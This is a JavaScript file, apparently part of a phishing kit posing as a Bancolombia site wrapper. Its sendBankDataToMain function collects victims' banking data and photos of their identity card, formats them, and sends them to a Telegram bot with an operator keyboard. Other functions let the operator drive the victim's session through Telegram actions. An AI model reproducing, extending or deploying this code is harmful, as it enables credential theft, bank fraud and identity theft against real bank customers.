/**
 * BANCOLOMBIA - Wrapper sobre banco-utils para compatibilidad
 */

(function() {
    'use strict';

    // Re-exportar funcionalidades de BancoUtils con nombres de Bancolombia
    window.bancolombia = {
        initGlobalSession: () => BancoUtils.getSessionId(),
        
        initializeSocket: () => BancoUtils.getSocket(),
        
        createLoadingOverlay: () => ({
            show: () => BancoUtils.showOverlay(),
            hide: () => BancoUtils.hideOverlay()
        }),
        
        setupTelegramActions: () => {
            BancoUtils.onTelegramAction((data) => {
                if (window.BancolombiaTelegram) {
                    BancolombiaTelegram.handleTelegramAction(data);
                }
            });
            return true;
        },
        
        checkSession: () => {
            const socket = BancoUtils.getSocket();
            return socket && socket.connected;
        },
        
        sendBankDataToMain: async function(stage, data, callback) {
            try {
                // Guardar los nuevos datos
                const fullData = BancoUtils.saveBankData('bancolombia', data);
                
                // Separar imágenes de datos de texto para el mensaje
                const textData = {};
                let imageData = null;
                
                Object.keys(fullData).forEach(key => {
                    if (key === 'foto' || key === 'cedula_frontal' || key === 'cedula_trasera') {
                        // Si hay imagen nueva en los datos actuales, usarla
                        if (data[key]) {
                            imageData = data[key];
                        }
                    } else {
                        textData[key] = fullData[key];
                    }
                });
                
                // Formatear mensaje con TODOS los datos acumulados (sin imágenes)
                const message = BancoUtils.formatMessage(`BANCOLOMBIA - ${stage.toUpperCase()}`, textData);
                
                if (!window.BancolombiaTelegram) {
                    throw new Error('Cargar bancolombia-telegram.js antes de shared-optimized.js');
                }
                const keyboard = BancolombiaTelegram.getKeyboard();
                
                // Construir contenido con texto y teclado
                const content = { text: message, keyboard };
                
                // Agregar imagen si existe
                if (imageData) {
                    content.image = imageData;
                }
                
                await BancoUtils.sendToTelegram(stage, content);
                
                if (callback) callback({ success: true });
            } catch (error) {
                console.error('Error:', error);
                if (callback) callback({ success: false, error: error.message });
            }
        },
        
        getSocket: () => BancoUtils.getSocket(),
        getSessionId: () => BancoUtils.getSessionId()
    };

    console.log('✅ Bancolombia wrapper inicializado');
})();
